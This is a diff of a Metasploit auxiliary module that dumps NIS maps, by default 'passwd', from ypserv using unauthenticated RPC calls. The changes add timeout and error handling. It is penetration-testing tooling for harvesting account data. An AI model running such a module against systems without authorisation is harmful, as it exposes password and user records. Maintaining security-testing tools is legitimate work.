@@ -40,6 +40,10 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('DOMAIN', [true, 'NIS domain']),
       OptString.new('MAP',    [true, 'NIS map to dump', 'passwd'])
     ])
+
+    register_advanced_options([
+      OptFloat.new('XDRTimeout', [true, 'XDR decoding timeout', 10.0])
+    ])
   end
 
   def run
@@ -56,6 +60,9 @@ class MetasploitModule < Msf::Auxiliary
     rescue Rex::ConnectionError
       print_error('Could not connect to portmapper')
       return
+    rescue Rex::Proto::SunRPC::RPCError
+      print_error('Could not connect to ypserv')
+      return
     end
 
     # Flavor: AUTH_NULL (0)
@@ -67,11 +74,14 @@ class MetasploitModule < Msf::Auxiliary
       map_name # Map Name: passwd.byname
     )
 
-    res = begin
-      sunrpc_call(
+    begin
+      res = sunrpc_call(
         8,              # Procedure: ALL (8)
         ypserv_all_call # Yellow Pages Service ALL call
       )
+    rescue Rex::Proto::SunRPC::RPCError
+      print_error('Could not call ypserv procedure')
+      return
     ensure
       # Shut it down! Shut it down forever!
       sunrpc_destroy
@@ -94,7 +104,14 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    map = parse_map(res)
+    map = begin
+      Timeout.timeout(datastore['XDRTimeout']) do
+        parse_map(res)
+      end
+    rescue Timeout::Error
+      print_error('XDR decoding timed out (try increasing XDRTimeout?)')
+      return
+    end
 
     if map.nil? || map.empty?
       print_error("Could not parse map #{map_name}")
@@ -112,31 +129,22 @@ class MetasploitModule < Msf::Auxiliary
   def parse_map(res)
     map = {}
 
-    # TODO: Find a more elegant solution
-    begin
-      # We steal TIMEOUT from the mixin
-      Timeout.timeout(datastore['TIMEOUT']) do
-        loop do
-          begin
-            # XXX: res is modified in place
-            _, status, value, key = Rex::Encoder::XDR.decode!(
-              res,
-              Integer, # More: Yes
-              Integer, # Status: YP_TRUE (1)
-              String,  # Value: [redacted]
-              String   # Key: [redacted]
-            )
+    loop do
+      begin
+        # XXX: res is modified in place
+        _, status, value, key = Rex::Encoder::XDR.decode!(
+          res,
+          Integer, # More: Yes
+          Integer, # Status: YP_TRUE (1)
+          String,  # Value: [redacted]
+          String   # Key: [redacted]
+        )
 
-            map[key] = value if status == 1
-          rescue Rex::ArgumentError
-            vprint_status("Finished XDR decoding at #{res.inspect}")
-            return map
-          end
-        end
+        status == 1 ? map[key] = value : break
+      rescue Rex::ArgumentError
+        vprint_status("Finished XDR decoding at #{res.inspect}")
+        break
       end
-    rescue Timeout::Error
-      print_error('XDR decoding timed out (try increasing TIMEOUT?)')
-      return
     end
 
     map
